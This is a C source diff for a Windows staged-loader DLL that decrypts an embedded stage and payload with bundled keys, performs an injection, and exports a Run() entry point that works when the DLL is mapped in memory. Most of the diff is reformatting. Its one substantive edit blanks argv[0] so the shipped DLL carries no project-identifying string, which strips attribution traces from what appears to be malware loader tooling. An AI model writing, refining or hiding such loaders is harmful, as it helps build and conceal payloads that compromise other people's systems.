@@ -11,8 +11,8 @@
  * RCDATA resources, the exports work even when the DLL is mapped in memory
  * instead of loaded with LoadLibrary.
  *
- * The stage is built with STAGED_LOADER_NO_SERVICE, so a bare Run() performs one
- * injection and never touches the service manager.
+ * The stage is built with STAGED_LOADER_NO_SERVICE, so a bare Run() performs
+ * one injection and never touches the service manager.
  */
 #ifndef UNICODE
 #define UNICODE
@@ -33,14 +33,20 @@
 
 static int run_stage(int argc, wchar_t **argv) {
   return staged_loader_bootstrap(
-      staged_loader_stage_start, (size_t)(staged_loader_stage_end - staged_loader_stage_start),
-      staged_loader_stage_key_start, (size_t)(staged_loader_stage_key_end - staged_loader_stage_key_start),
-      staged_loader_payload_start, (size_t)(staged_loader_payload_end - staged_loader_payload_start),
-      staged_loader_key_start, (size_t)(staged_loader_key_end - staged_loader_key_start), argc, argv);
+      staged_loader_stage_start,
+      (size_t)(staged_loader_stage_end - staged_loader_stage_start),
+      staged_loader_stage_key_start,
+      (size_t)(staged_loader_stage_key_end - staged_loader_stage_key_start),
+      staged_loader_payload_start,
+      (size_t)(staged_loader_payload_end - staged_loader_payload_start),
+      staged_loader_key_start,
+      (size_t)(staged_loader_key_end - staged_loader_key_start), argc, argv);
 }
 
 __declspec(dllexport) int __cdecl Run(void) {
-  wchar_t *argv[] = {L"staged_loader"};
+  /* argv[0] is never inspected by the stage; keep it empty so the shipped
+   * DLL carries no project-identifying string. */
+  wchar_t *argv[] = {L""};
   return run_stage(1, argv);
 }
 
